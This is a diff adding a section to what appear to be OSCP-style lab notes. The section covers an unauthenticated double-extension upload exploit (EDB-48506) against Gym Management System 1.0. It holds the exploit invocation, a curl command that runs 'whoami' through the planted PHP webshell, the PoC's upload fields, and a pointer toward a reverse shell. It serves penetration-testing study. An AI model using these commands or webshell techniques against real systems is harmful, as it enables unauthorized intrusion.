@@ -212,6 +212,35 @@ See [[09. Common Web Application Attacks#9.3.2. Using Non-Executable Files|9.3.2
 
 ---
 
+## Gym Management System 1.0 — unauthenticated double-extension upload
+
+EDB-48506 abuses an upload handler that checks the final extension and
+multipart MIME type but names the destination with the middle extension.
+
+~~~bash
+python2 $BoxDir/exploits/48506.py http://$BoxIP:$WebPort/
+curl -s "http://$BoxIP:$WebPort/upload/kamehameha.php?telepathy=whoami"
+~~~
+
+The PoC submits:
+
+- id=kamehameha
+- filename=kaio-ken.php.png
+- Content-Type=image/png
+- pupload=upload
+- PNG magic bytes followed by PHP code
+
+The handler writes upload/kamehameha.php, which can be triggered with the
+telepathy GET parameter. Confirm code execution before attempting a reverse
+shell.
+
+See [[RUNBOOK V2/Windows - Web - Gym Management Upload]] and
+[[OSCP/BOXES/WRITE UPS/Windows/Buff|Buff]].
+
+#### Tags: #GymManagement #EDB48506 #UnauthenticatedUpload #DoubleExtension #PHPWebshell
+
+---
+
 ## WordPress Plugin Upload — Two-Step via Plugin Engine (CVE-2020-36847)
 
 Simple File List <= 4.2.2. Unauthenticated upload requests can fail with HTTP 500 unless the plugin-specific POST fields are supplied.
